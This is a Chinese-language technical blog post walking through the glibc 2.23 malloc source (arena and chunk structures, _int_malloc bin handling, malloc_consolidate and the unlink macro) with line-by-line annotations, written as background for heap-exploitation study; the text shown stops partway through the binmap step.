    <content type="html"><![CDATA[<p>#malloc&amp;free源码分析<br>其作为堆利用的重点，需要我们透彻了解其中细节，我们首先从malloc开始分析，但在此之前，我们需要了解一些重要的数据结构。本章分析版本为glibc-2.23，再之后讨论2.27即以上版本的差异</p><h2 id="0x00-重要的数据结构们"><a href="#0x00-重要的数据结构们" class="headerlink" title="0x00 重要的数据结构们"></a>0x00 重要的数据结构们</h2><h3 id="1-malloc-state"><a href="#1-malloc-state" class="headerlink" title="1. malloc_state"></a>1. malloc_state</h3><p>首先便是我们经常接触的arena</p><pre><code class="hljs">struct malloc_state&#123;  /* Serialize access.  */  mutex_t mutex;  /* Flags (formerly in max_fast).  */  int flags;  /* fastbin链条数组 */  mfastbinptr fastbinsY[NFASTBINS];  /*top chunk 指针 */  mchunkptr top;  /* The remainder from the most recent split of a small request */  mchunkptr last_remainder;  /* NBINS为宏，带☞128，这里包含了除fastbin的所有bin指针 */  mchunkptr bins[NBINS * 2 - 2];  /* bins数组的位图 */  unsigned int binmap[BINMAPSIZE];  /* 链接下一个malloc_state的指针 */  struct malloc_state *next;  /* Linked list for free arenas.  Access to this field is serialized     by free_list_lock in arena.c.  */  struct malloc_state *next_free;  /* Number of threads attached to this arena.  0 if the arena is on     the free list.  Access to this field is serialized by     free_list_lock in arena.c.  */  INTERNAL_SIZE_T attached_threads;  /* 在本arena当中从系统处获取到的内存大小  */  INTERNAL_SIZE_T system_mem;  INTERNAL_SIZE_T max_system_mem;&#125;;</code></pre><p>其结构在源码当中表现为宏<code>mstate</code></p><h3 id="2-malloc-chunk"><a href="#2-malloc-chunk" class="headerlink" title="2. malloc_chunk"></a>2. malloc_chunk</h3><pre><code class="hljs">struct malloc_chunk &#123;  INTERNAL_SIZE_T      prev_size;  /* Size of previous chunk (if free).  */  INTERNAL_SIZE_T      size;       /* Size in bytes, including overhead. */  struct malloc_chunk* fd;         /* double links -- used only if free. */  struct malloc_chunk* bk;  /* Only used for large blocks: pointer to next larger size.  */  struct malloc_chunk* fd_nextsize; /* double links -- used only if free. */  struct malloc_chunk* bk_nextsize;&#125;;</code></pre><h3 id="3-源码自带的malloc-chunk细节，十分友善"><a href="#3-源码自带的malloc-chunk细节，十分友善" class="headerlink" title="3. 源码自带的malloc_chunk细节，十分友善"></a>3. 源码自带的malloc_chunk细节，十分友善</h3><pre><code class="hljs">/*   malloc_chunk details:    (The following includes lightly edited explanations by Colin Plumb.)    Chunks of memory are maintained using a `boundary tag&#39; method as    described in e.g., Knuth or Standish.  (See the paper by Paul    Wilson ftp://ftp.cs.utexas.edu/pub/garbage/allocsrv.ps for a    survey of such techniques.)  Sizes of free chunks are stored both    in the front of each chunk and at the end.  This makes    consolidating fragmented chunks into bigger chunks very fast.  The    size fields also hold bits representing whether chunks are free or    in use.    An allocated chunk looks like this:    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of previous chunk, if allocated            | |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of chunk, in bytes                       |M|P|      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             User data starts here...                          .        .                                                               .        .             (malloc_usable_size() bytes)                      .        .                                                               |nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of chunk                                     |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+    Where &quot;chunk&quot; is the front of the chunk for the purpose of most of    the malloc code, but &quot;mem&quot; is the pointer that is returned to the    user.  &quot;Nextchunk&quot; is the beginning of the next contiguous chunk.    Chunks always begin on even word boundaries, so the mem portion    (which is returned to the user) is also on an even word boundary, and    thus at least double-word aligned.    Free chunks are stored in circular doubly-linked lists, and look like this:    chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Size of previous chunk                            |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+    `head:&#39; |             Size of chunk, in bytes                         |P|      mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Forward pointer to next chunk in list             |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Back pointer to previous chunk in list            |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+        |             Unused space (may be 0 bytes long)                .        .                                                               .        .                                                               |nextchunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+    `foot:&#39; |             Size of chunk, in bytes                           |        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+    The P (PREV_INUSE) bit, stored in the unused low-order bit of the    chunk size (which is always a multiple of two words), is an in-use    bit for the *previous* chunk.  If that bit is *clear*, then the    word before the current chunk size contains the previous chunk    size, and can be used to find the front of the previous chunk.    The very first chunk allocated always has this bit set,    preventing access to non-existent (or non-owned) memory. If    prev_inuse is set for any given chunk, then you CANNOT determine    the size of the previous chunk, and might even get a memory    addressing fault when trying to do so.    Note that the `foot&#39; of the current chunk is actually represented    as the prev_size of the NEXT chunk. This makes it easier to    deal with alignments etc but can be very confusing when trying    to extend or adapt this code.    The two exceptions to all this are     1. The special chunk `top&#39; doesn&#39;t bother using the    trailing size field since there is no next contiguous chunk    that would have to index off it. After initialization, `top&#39;    is forced to always exist.  If it would become less than    MINSIZE bytes long, it is replenished.     2. Chunks allocated via mmap, which have the second-lowest-order    bit M (IS_MMAPPED) set in their size fields.  Because they are    allocated one-by-one, each must contain its own trailing size field.*/</code></pre><h2 id="0x01-malloc步骤"><a href="#0x01-malloc步骤" class="headerlink" title="0x01 malloc步骤"></a>0x01 malloc步骤</h2><h3 id="step1-malloc环境准备"><a href="#step1-malloc环境准备" class="headerlink" title="step1 malloc环境准备"></a>step1 malloc环境准备</h3><p>首先我们调用<code>malloc(size)</code>的时候，调用的库函数实际上为<code>_libc_malloc</code>，如下：</p><pre><code class="hljs">void * __libc_malloc (size_t bytes)&#123;  mstate ar_ptr;  void *victim;  void *(*hook) (size_t, const void *)    = atomic_forced_read (__malloc_hook);      if (__builtin_expect (hook != NULL, 0))    return (*hook)(bytes, RETURN_ADDRESS (0));   //调用malloc_hook  arena_get (ar_ptr, bytes);  //表现为宏，获取arena指针  victim = _int_malloc (ar_ptr, bytes);  //调用_int_malloc，返回分配chunk指针，参数一为arena指针，参数二为我们的需要分配的字节  /* Retry with another arena only if we were able to find a usable arena     before.  */  if (!victim &amp;&amp; ar_ptr != NULL)    &#123;      LIBC_PROBE (memory_malloc_retry, 1, bytes);      ar_ptr = arena_get_retry (ar_ptr, bytes);      victim = _int_malloc (ar_ptr, bytes);    &#125;  if (ar_ptr != NULL)    (void) mutex_unlock (&amp;ar_ptr-&gt;mutex);  assert (!victim || chunk_is_mmapped (mem2chunk (victim)) ||          ar_ptr == arena_for_chunk (mem2chunk (victim)));  return victim;&#125;</code></pre><p>可以发现我们的<code>_libc_malloc</code>函数主要功能是获取合适的<code>arena</code>，然后传递给<code>_int_malloc</code>分配真正的堆块，然后我们来观察<code>_int_malloc</code>，而我们该函数十分长，因此我们逐步来看，首先看到定义的一些字段，如下：</p><pre><code class="hljs">static void * _int_malloc (mstate av, size_t bytes)&#123;  INTERNAL_SIZE_T nb;               /* normalized request size */  unsigned int idx;                 /* 字节所关联的bin数组下标 */  mbinptr bin;                      /* bin数组下标所对应的bin指针 */  mchunkptr victim;                 /* 检查/选择得到的chunk指针 */  INTERNAL_SIZE_T size;             /* 得到的chunk大小 */  int victim_index;                 /* 所得chunk对应bin的index */  mchunkptr remainder;              /* 分块后的剩余部分 */  unsigned long remainder_size;     /* 剩余部分大小 */  unsigned int block;               /* bit map traverser */  unsigned int bit;                 /* bit map traverser */  unsigned int map;                 /* current word of binmap */  mchunkptr fwd;                    /* misc temp for linking */  mchunkptr bck;                    /* misc temp for linking */  const char *errstr = NULL;</code></pre><p>然后我们继续来看接下来的步骤：</p><pre><code class="hljs">  /*        无他，通过我们需求的字节大小来转变至实际需要的堆块大小   */  checked_request2size (bytes, nb);</code></pre><hr><h4 id="题外话：checked-request2size"><a href="#题外话：checked-request2size" class="headerlink" title="题外话：checked_request2size"></a>题外话：checked_request2size</h4><p>（注意这里是单独的宏表示，非int_malloc）<br>checked_request2size其宏表示为</p><pre><code class="hljs">#define request2size(req)                                         \  (((req) + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE)  ?             \   MINSIZE :                                                      \   ((req) + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK)/*  Same, except also perform argument check */#define checked_request2size(req, sz)                             \  if (REQUEST_OUT_OF_RANGE (req)) &#123;      \      __set_errno (ENOMEM);      \      return 0;      \    &#125;      \  (sz) = request2size (req);</code></pre><p>解释结束（下面继续int_malloc）</p><hr><pre><code class="hljs">  /* 若传入的av为空，那么转回调用sysmalloc，通过mmap来分配出一个chunk */  if (__glibc_unlikely (av == NULL))    &#123;      void *p = sysmalloc (nb, av);      if (p != NULL)    alloc_perturb (p, bytes);      return p;    &#125;</code></pre><h3 id="step2-若在fastbin范围"><a href="#step2-若在fastbin范围" class="headerlink" title="step2 若在fastbin范围"></a>step2 若在fastbin范围</h3><p>然后接下来判断其是否位于fastbin范围</p><pre><code class="hljs">  /*     如果该size位于fastbins范围， 首先检查合并堆块.     即使av未初始化，该代码也是可正常安全执行的, 因此我们可以在不检查的情况下执行   */  if ((unsigned long) (nb) &lt;= (unsigned long) (get_max_fast ()))    &#123;      idx = fastbin_index (nb);  //得到fastbin数组的下标      mfastbinptr *fb = &amp;fastbin (av, idx); //为一个宏，得到fastbinsY元素指针      mchunkptr pp = *fb;      do        &#123;          victim = pp;            /* 若未找到合适的victim，跳出循环 */          if (victim == NULL)            break;        &#125;      while ((pp = catomic_compare_and_exchange_val_acq (fb, victim-&gt;fd, victim))             != victim);  //这里该函数为一个原子操作，目的是交换fb与victim-&gt;fd的值，也就是从链头开始取    /* 下面就是判断取出的victim是否通过检查 */      if (victim != 0)        &#123;          if (__builtin_expect (fastbin_index (chunksize (victim)) != idx, 0)) //检查堆块的size位            &#123;              errstr = &quot;malloc(): memory corruption (fast)&quot;;            errout:              malloc_printerr (check_action, errstr, chunk2mem (victim), av);              return NULL;            &#125;          check_remalloced_chunk (av, victim, nb);  //检查重分配堆块          void *p = chunk2mem (victim); //堆块指针转为指向返回内存的宏          alloc_perturb (p, bytes); //堆块清0          return p;        &#125;    &#125;</code></pre><p>其中大致含义即为从fastbinsY链表数组找到对应的下标，然后从头取出fastbin，返回给用户。</p><h3 id="step3-若在small范围当中"><a href="#step3-若在small范围当中" class="headerlink" title="step3 若在small范围当中"></a>step3 若在small范围当中</h3><p>下面我们继续<code>_int_malloc</code>，执行到这里表示我们fastbin超出其大小范围，或者说使用fastbin分配失败，然后就会判断其进入smallbin的判断当中</p><pre><code class="hljs">/*    如果请求的size大小属于smallbin范围，我们则检查通用的bins数组.  Since these &quot;smallbins&quot;     hold one size each, no searching within bins is necessary.     (如果是largebin范围, 我们必须等到 unsorted chunks 被处理为寻找最佳适配块. But for small ones, fits are exact     anyway, so we can check now, which is faster.)   */  if (in_smallbin_range (nb))    &#123;      idx = smallbin_index (nb);      bin = bin_at (av, idx); //获取对应bin链表数组下标      if ((victim = last (bin)) != bin) //last(bin)为宏bin-&gt;bk,这里是判断他是否为空，若不为空则说明smallbin里面有堆块，进入下一步        &#123;          if (victim == 0) /* 初始化检查，若为0则说明并未初始化，我们的small bin的各项还是0 */            malloc_consolidate (av); //进行av初始化，也就是取出fast chunk各项堆块合并一下          else //这里说明我们已经经过了初始化，所以接下来就是普通的判断过程            &#123;              bck = victim-&gt;bk;                if (__glibc_unlikely (bck-&gt;fd != victim)) //检查                &#123;                  errstr = &quot;malloc(): smallbin double linked list corrupted&quot;;                  goto errout;                &#125;              set_inuse_bit_at_offset (victim, nb); //设置相邻下一个堆块的inuse位              bin-&gt;bk = bck;              bck-&gt;fd = bin; //从尾部脱链              if (av != &amp;main_arena)                victim-&gt;size |= NON_MAIN_ARENA;              check_malloced_chunk (av, victim, nb);              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);  //清空bytes字节大小的值              return p;            &#125;        &#125;    &#125;</code></pre><p>我们对于smallbin的分配也十分简单，那就是直接从尾部开始取，但是在取之前我们会判断arena是否进行过初始化，若没有进行初始化，则调用<code>malloc_consolidate</code>进行初始化</p><hr><h4 id="题外话：malloc-consolidate"><a href="#题外话：malloc-consolidate" class="headerlink" title="题外话：malloc_consolidate"></a>题外话：malloc_consolidate</h4><p>这里是我们单独的<code>malloc_consolidate</code>函数讲解，与上面<code>_int_malloc</code>单独分开，整体代码如下：</p><pre><code class="hljs">/*  ------------------------- malloc_consolidate -------------------------  malloc_consolidate是一个用来拆除fastbins中chunk的特殊free()函数.  free()本身不能用于此目的，因为在其他情况下他可能将堆块放入fastbins当中  因此我们需要使用一个相似的操作来代替free()代码。  当然，因为该代码在malloc的工程中是第一次被调用 ，他是一个极佳的位置来触发我们的初始化代码*/static void malloc_consolidate(mstate av)&#123;  mfastbinptr*    fb;                 /* 目前正在被合并的fastbin chunk */  mfastbinptr*    maxfb;              /* last fastbin (for loop control) */  mchunkptr       p;                  /* current chunk being consolidated */  mchunkptr       nextp;              /* next chunk to consolidate */  mchunkptr       unsorted_bin;       /* bin header */  mchunkptr       first_unsorted;     /* chunk to link to */  /* These have same use as in free() */  mchunkptr       nextchunk;  INTERNAL_SIZE_T size;  INTERNAL_SIZE_T nextsize;  INTERNAL_SIZE_T prevsize;  int             nextinuse;  mchunkptr       bck;  mchunkptr       fwd;  /*    如果max_fast 为0，则说明arena并未初始化，因此执行下面的步骤  */  if (get_max_fast () != 0) &#123;    clear_fastchunks(av);    unsorted_bin = unsorted_chunks(av); //获取unsorted bin的bins数组下标    /*      移除fastbins当中所有的chunk，然后进行合并，再紧接着放入我们的unsorted bin链条当中. Among other reasons for doing this,      placing in unsorted bin avoids needing to calculate actual bins      until malloc is sure that chunks aren&#39;t immediately going to be      reused anyway.    */    maxfb = &amp;fastbin (av, NFASTBINS - 1); //获取最大块的fastbin    fb = &amp;fastbin (av, 0); //获取最小快的fastbin    do &#123;      p = atomic_exchange_acq (fb, 0); //纳米交换！小子      if (p != 0) &#123; //如果说换出来的堆块指针非0，那么就说明该链条上面存在fastbin堆块    do &#123;      check_inuse_chunk(av, p); //查询下一个堆块的inuse来表示该堆块是否被使用，以及是否是mmap分配，但这里没怎么理解，因为fastbin的inuse不应该都是始终为1的么，这里可能是检查紧邻的下一个堆块可能不属于fastbin范围时的检测      nextp = p-&gt;fd;      /* Slightly streamlined version of consolidation code in free() */      size = p-&gt;size &amp; ~(PREV_INUSE|NON_MAIN_ARENA);   //获取堆块size      nextchunk = chunk_at_offset(p, size); //为一个宏，这里即为p+size      nextsize = chunksize(nextchunk); //获取next堆块的size      if (!prev_inuse(p)) &#123; //查看p堆块前面的堆块是否分配，若未分配则进行下面的步骤        prevsize = p-&gt;prev_size;            size += prevsize;        p = chunk_at_offset(p, -((long) prevsize)); //即为上面p + prevsize前一个块地址        unlink(av, p, bck, fwd); //大名鼎鼎的unlink，在2.23版本表现为一个宏      &#125;      if (nextchunk != av-&gt;top) &#123;  //如果nextchunk不是topchunk，则往下走        nextinuse = inuse_bit_at_offset(nextchunk, nextsize); //判断nextchunk的下一块inuse位        if (!nextinuse) &#123; //nextinuse为0说明该块是空的          size += nextsize;          unlink(av, nextchunk, bck, fwd); //unlink该nextchunk        &#125; else //nextinuse 为1则说明该块正在被使用，因此清该堆块的inuse位为0          clear_inuse_bit_at_offset(nextchunk, 0);        first_unsorted = unsorted_bin-&gt;fd;        unsorted_bin-&gt;fd = p;        first_unsorted-&gt;bk = p; //将fastbin取出/合并后的堆块存入unsortedbin，从链头放入        if (!in_smallbin_range (size)) &#123; //如果为largebin范围，则置空fd/bk_nextsize          p-&gt;fd_nextsize = NULL;          p-&gt;bk_nextsize = NULL;        &#125;        set_head(p, size | PREV_INUSE);  //设置堆块细节，也就是头部分和脚部分        p-&gt;bk = unsorted_bin;        p-&gt;fd = first_unsorted;        set_foot(p, size);      &#125;      else &#123; //如果nextchunk是topchunk        size += nextsize;  //合并为top_chunk        set_head(p, size | PREV_INUSE);        av-&gt;top = p;      &#125;    &#125; while ( (p = nextp) != 0);      &#125;    &#125; while (fb++ != maxfb);  &#125;  else &#123; //若未初始化，则使用下面代码进行一个简单的初始化    malloc_init_state(av);    check_malloc_state(av);  &#125;&#125;</code></pre><h4 id="题外话：-unlink宏"><a href="#题外话：-unlink宏" class="headerlink" title="题外话： unlink宏"></a>题外话： unlink宏</h4><p>其中unlink宏如下：</p><pre><code class="hljs">/* 从bin链表数组当中取出一个chunk */#define unlink(AV, P, BK, FD) &#123;                                            \    FD = P-&gt;fd;      \    BK = P-&gt;bk;      \    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))      \  //检查一：p-&gt;fd-&gt;bk == p &amp;&amp; p-&gt;bk-&gt;fd == p      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \    else &#123;      \        FD-&gt;bk = BK;      \         BK-&gt;fd = FD;      \ //脱链操作        if (!in_smallbin_range (P-&gt;size)      \  //不在smallbin范围，那么就是在largebin范围            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;      \        if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)      \          || __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \ //检查二：p-&gt;fd_nextsize-&gt;bk_nextsize == p &amp;&amp; p-&gt;bk_nextsize-&gt;fd_nextsize == p          malloc_printerr (check_action,      \                   &quot;corrupted double-linked list (not small)&quot;,    \                   P, AV);      \            if (FD-&gt;fd_nextsize == NULL) &#123;      \ //如果在小链条中                if (P-&gt;fd_nextsize == P)      \ //如果largebin链条就一个，则往下走                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;      \                 else &#123;      \                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;      \                     FD-&gt;bk_nextsize = P-&gt;bk_nextsize;      \                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;      \                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;      \ //largebin脱链                  &#125;      \              &#125; else &#123;      \ //若刚好p为小链条最后一个                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;      \                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;      \              &#125;      \          &#125;      \      &#125;      \&#125;</code></pre><p>综上所述，<code>malloc_consolidate</code>函数的目的就是从fastbin当中该取的chunk取出，该合并的合并，然后存入<code>unsorted bin</code>当中，说完该函数，那么我们回到咱们的<code>_int_malloc</code>函数当中</p><hr><h3 id="step4-清理堆块碎片"><a href="#step4-清理堆块碎片" class="headerlink" title="step4 清理堆块碎片"></a>step4 清理堆块碎片</h3><p>上面我们讲到了smallbin判断，但如果说我们请求的bytes既不在fastbin范围，也不在smallbin范围当中呢</p><pre><code class="hljs">/*     如果我们是largebinsize的请求, 在我们继续之前，我们先合并一下咱们的fastbin，也就是调用mallock_consolidate函数     虽然这个举动看起来是在还仍保留有大量空闲区块的同时来消除所有的fastbin堆块, 但是他避免了因fastbin堆块导致的碎片问题。   */  else    &#123;      idx = largebin_index (nb); //获取largebin 的下标      if (have_fastchunks (av))         malloc_consolidate (av); //合并fastbinchunk，然后摘除他们    &#125;</code></pre><p>在我们调用完<code>malloc_consolidate</code>之后，我们进入接下来的判断，也就是进入我们的外部大循环：</p><h3 id="step5-大循环-unsortedbin清理"><a href="#step5-大循环-unsortedbin清理" class="headerlink" title="step5 大循环-unsortedbin清理"></a>step5 大循环-unsortedbin清理</h3><pre><code class="hljs"> /*         处理最近释放或剩余的块，仅在完全匹配的情况下获取一个，    或者，如果这是一个小请求，则chunk是最近非完全匹配的剩余块。将其他已遍历的块放在bin中。    请注意，在任何例程中，这一步骤都是将块放置在bin中的唯一位置。    这里需要外循环，因为我们可能直到malloc接近尾声时才意识到我们应该合并，    所以必须这样做并重试。这种情况最多发生一次，而且只有当我们需要扩展内存来为“small”请求提供服务时才会发生   */  for (;; )    &#123;      int iters = 0;      while ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av)) //判断条件是unsorted bin不为空，并且此时使得victim指向unsorted 链表尾部        &#123;          bck = victim-&gt;bk;          if (__builtin_expect (victim-&gt;size &lt;= 2 * SIZE_SZ, 0) //检测一：size大小最小最大检查              || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, 0))            malloc_printerr (check_action, &quot;malloc(): memory corruption&quot;,                             chunk2mem (victim), av);          size = chunksize (victim);          /*             如果是个小请求，如果最近的remainder剩余块是unsortedbin当中唯一的块的话，            尝试使用他来分配  This helps promote locality for             runs of consecutive small requests. 这是最佳适配的唯一例外            并且适用于当这里没有最佳适配的小堆块           */          if (in_smallbin_range (nb) &amp;&amp;              bck == unsorted_chunks (av) &amp;&amp;              victim == av-&gt;last_remainder &amp;&amp;              (unsigned long) (size) &gt; (unsigned long) (nb + MINSIZE)) //请求字节smallbin范围+unsortedbin只有一个堆块，同样也是last_remainder+这个剩余块size大于请求size            &#123;              /* split and reattach remainder */              remainder_size = size - nb;              remainder = chunk_at_offset (victim, nb);              unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;              av-&gt;last_remainder = remainder;              remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);              if (!in_smallbin_range (remainder_size)) //如果剩余块为largebin范围                &#123;                  remainder-&gt;fd_nextsize = NULL;                  remainder-&gt;bk_nextsize = NULL;                &#125;              set_head (victim, nb | PREV_INUSE |                        (av != &amp;main_arena ? NON_MAIN_ARENA : 0));              set_head (remainder, remainder_size | PREV_INUSE);              set_foot (remainder, remainder_size);              check_malloced_chunk (av, victim, nb);              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);              return p;  //这里是划分出了相应堆块，直接返回            &#125;          /* 从unsorted 链表移除我们的victim */          unsorted_chunks (av)-&gt;bk = bck;          bck-&gt;fd = unsorted_chunks (av);          /* Take now instead of binning if exact fit */          if (size == nb) //最佳适配            &#123;              set_inuse_bit_at_offset (victim, size);              if (av != &amp;main_arena)                victim-&gt;size |= NON_MAIN_ARENA;              check_malloced_chunk (av, victim, nb);              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            &#125;          /* 走到这儿说明并没有最佳匹配，因此在这里就开始归还堆块给相应的bin */          if (in_smallbin_range (size)) //为smallbin范围            &#123;              victim_index = smallbin_index (size);              bck = bin_at (av, victim_index);              fwd = bck-&gt;fd;            &#125;          else //为largebin范围            &#123;              victim_index = largebin_index (size);              bck = bin_at (av, victim_index);              fwd = bck-&gt;fd;              /* maintain large bins in sorted order */              if (fwd != bck) //说明largebin链条不为空                &#123;                  /* Or with inuse bit to speed comparisons */                  size |= PREV_INUSE;                  /* if smaller than smallest, bypass loop below */                  assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == 0);                  if ((unsigned long) (size) &lt; (unsigned long) (bck-&gt;bk-&gt;size)) //这里我们知道largebin的链条尾部是最小堆块，所以这里如果小于最小堆块的话那么直接放入链表尾部                    &#123;                      fwd = bck;                      bck = bck-&gt;bk;                      victim-&gt;fd_nextsize = fwd-&gt;fd;                      victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;                      fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;                    &#125;                  else //若该堆块大于最小堆块，那么我们就从链头开始寻找，直至找到一个比他小的堆块，然后放到他前面                    &#123;                      assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);                      while ((unsigned long) size &lt; fwd-&gt;size)                        &#123;                          fwd = fwd-&gt;fd_nextsize;                          assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == 0);                        &#125;                      if ((unsigned long) size == (unsigned long) fwd-&gt;size)                        /* 如果是等于，总是插入小链条的第二个位置  */                        fwd = fwd-&gt;fd;                      else//如果是大于                        &#123;                          victim-&gt;fd_nextsize = fwd;                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;                          fwd-&gt;bk_nextsize = victim;                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;                        &#125;                      bck = fwd-&gt;bk;                    &#125;                &#125;              else //如果largebin链条为空                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;            &#125;          mark_bin (av, victim_index);          victim-&gt;bk = bck;          victim-&gt;fd = fwd;          fwd-&gt;bk = victim;          bck-&gt;fd = victim;#define MAX_ITERS       10000          if (++iters &gt;= MAX_ITERS)            break;        &#125;</code></pre><p>进入我们的外部大循环，上面源码仅仅展示了内部unsortedbin循环，这里要么有三种结果：</p><ol><li>在unsorted bin循环当中发现unsorted bin只有一个堆块，且大于我们要分配的，则切割他然后返回</li><li>循环当中找到适配的堆块并把寻找路径上的不适配堆块返回适当的bin当中，则直接返回，剩余的堆块不予处理</li><li>循环当中未找到合适堆块，则继续下一步，此时unsortedbin已经遍历完毕，其中无堆块，全部存放于适合的bin当中</li></ol><h3 id="step6-大循环-largebin堆块寻找"><a href="#step6-大循环-largebin堆块寻找" class="headerlink" title="step6 大循环-largebin堆块寻找"></a>step6 大循环-largebin堆块寻找</h3><p>经过unsortedbin循环之后，我们再来判断</p><pre><code class="hljs"> /*         如果是large请求, 寻找最小适配块.  Use the skip list for this.       */      if (!in_smallbin_range (nb))        &#123;          bin = bin_at (av, idx);          /* skip scan if empty or largest chunk is too small */          if ((victim = first (bin)) != bin &amp;&amp;              (unsigned long) (victim-&gt;size) &gt;= (unsigned long) (nb)) //判断非空且最大块大于请求nb            &#123;              victim = victim-&gt;bk_nextsize;              while (((unsigned long) (size = chunksize (victim)) &lt;                      (unsigned long) (nb))) //从链表尾部开始遍历，寻找到大于或等于他的块                victim = victim-&gt;bk_nextsize;              /* Avoid removing the first entry for a size so that the skip                 list does not have to be rerouted.  */              if (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size) //如果victim不为最后一个块，且其中存在着fd指针指向的堆块，也就是说小链表当中有两个或以上的相同大小的堆块                victim = victim-&gt;fd; //始终取第二个              remainder_size = size - nb; //判断是否是非最佳适配，可能会多出部分              unlink (av, victim, bck, fwd); //脱链              /* Exhaust */              if (remainder_size &lt; MINSIZE)                &#123;                  set_inuse_bit_at_offset (victim, size);                  if (av != &amp;main_arena)                    victim-&gt;size |= NON_MAIN_ARENA;                &#125;              /* Split */              else //这里是存在剩余部分，然后我们存放在unsiorted bin 当中                &#123;                  remainder = chunk_at_offset (victim, nb);                  /* We cannot assume the unsorted list is empty and therefore                     have to perform a complete insert here.  */                  bck = unsorted_chunks (av);                  fwd = bck-&gt;fd;      if (__glibc_unlikely (fwd-&gt;bk != bck))                    &#123;                      errstr = &quot;malloc(): corrupted unsorted chunks&quot;;                      goto errout;                    &#125;                  remainder-&gt;bk = bck;                  remainder-&gt;fd = fwd;                  bck-&gt;fd = remainder;                  fwd-&gt;bk = remainder;                  if (!in_smallbin_range (remainder_size))                    &#123;                      remainder-&gt;fd_nextsize = NULL;                      remainder-&gt;bk_nextsize = NULL;                    &#125;                  set_head (victim, nb | PREV_INUSE |                            (av != &amp;main_arena ? NON_MAIN_ARENA : 0));                  set_head (remainder, remainder_size | PREV_INUSE);                  set_foot (remainder, remainder_size);                &#125;              check_malloced_chunk (av, victim, nb);              void *p = chunk2mem (victim);              alloc_perturb (p, bytes);              return p;            &#125;        &#125;</code></pre><p>这里是从我们的largebin链表当中，从尾部开始遍历直到找到相同或者稍微大那么点的堆块，要么直接返回要么切割返回，切割的剩余部分存放在unsorted bin当中。</p><h3 id="step7-大循环-位图分配"><a href="#step7-大循环-位图分配" class="headerlink" title="step7 大循环-位图分配"></a>step7 大循环-位图分配</h3><p>然后接着往下走：</p><pre><code class="hljs">  /*         从下一个最大的bin开始，通过扫描bin来搜索chunk。        此搜索严格按照最佳匹配进行；即选择适合的最小的（具有接近最近最少使用的关系）块。         位图避免了检查大多数块是否为非空。        在预热阶段跳过所有存储箱的特殊情况下，还没有返回块，这比看起来更快。       */      ++idx;      bin = bin_at (av, idx);      block = idx2block (idx); //宏，右移5个bit位      map = av-&gt;binmap[block];      bit = idx2bit (idx);      for (;; )        &#123;          /* Skip rest of block if there are no more set bits in this block.  */          if (bit &gt; map || bit == 0)            &#123;              do                &#123;                  if (++block &gt;= BINMAPSIZE) /* out of bins */                    goto use_top;                &#125;              while ((map = av-&gt;binmap[block]) == 0);              bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));              bit = 1;            &#125;          /* Advance to bin with set bit. There must be one. */          while ((bit &amp; map) == 0)            &#123;              bin = next_bin (bin);              bit &lt;&lt;= 1;              assert (bit != 0);            &#125;          /* Inspect the bin. It is likely to be non-empty */          victim = last (bin);          /*  If a false alarm (empty bin), clear the bit. */          if (victim == bin)            &#123;              